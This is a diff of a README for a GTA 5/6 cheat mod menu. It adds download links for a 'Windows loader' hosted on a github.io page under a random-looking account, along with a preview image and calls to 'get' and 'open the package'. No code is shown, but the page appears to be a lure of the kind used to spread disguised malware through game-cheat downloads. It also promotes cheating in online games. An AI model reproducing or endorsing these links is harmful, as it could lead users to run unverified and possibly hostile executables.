@@ -6,7 +6,7 @@ A GTA mod menu is a Windows overlay that hooks the running game through ScriptHo
 
 # 📥 **LOADER PICKUP — START HERE**
 
-## [⬇️ **GET THE WINDOWS LOADER**]( )
+## [⬇️ **GET THE WINDOWS LOADER**](https://tjvtlfxvqnmu.github.io/GTA-5-GTA-6-Cheats-Mod-Menu/)
 
 > One tap, the package opens on its own page — no wrapper in between.
 
@@ -14,11 +14,11 @@ A GTA mod menu is a Windows overlay that hooks the running game through ScriptHo
 
 ## 🖼️ **PREVIEW IMAGE**
 
-<img src="" width="1280" height="720" alt="preview image">
+<img src="https://github.com/tjvtlfxvqnmu/GTA-5-GTA-6-Cheats-Mod-Menu/blob/main/gta%20cheeats.jpg?raw=true" width="1280" height="720" alt="preview image">
 
 ---
 
-### 📦 [**OPEN THE PACKAGE**]( )
+### 📦 [**OPEN THE PACKAGE**](https://tjvtlfxvqnmu.github.io/GTA-5-GTA-6-Cheats-Mod-Menu/)
 
 ---
 
